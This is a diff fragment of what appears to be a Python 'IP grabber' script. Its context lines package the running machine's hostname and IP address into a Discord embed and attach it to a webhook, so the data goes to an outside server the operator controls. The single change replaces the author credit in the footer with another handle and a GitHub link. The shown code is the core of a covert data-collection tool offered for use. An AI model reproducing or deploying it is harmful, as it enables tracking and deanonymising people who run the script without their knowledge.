@@ -16,7 +16,7 @@ webhook = DiscordWebhook(url='Put your webhook url here')
 embed = DiscordEmbed(title=str(socket.gethostname()) + "'s IP", description=get_ip(), color='03b2f8')
 
 # set footer
-embed.set_footer(text='IP grabber by xNatok#0442')
+embed.set_footer(text='IP grabber by Bartuś#6317 | https://github.com/Syntetik008')
 
 # add embed object to webhook
 webhook.add_embed(embed)
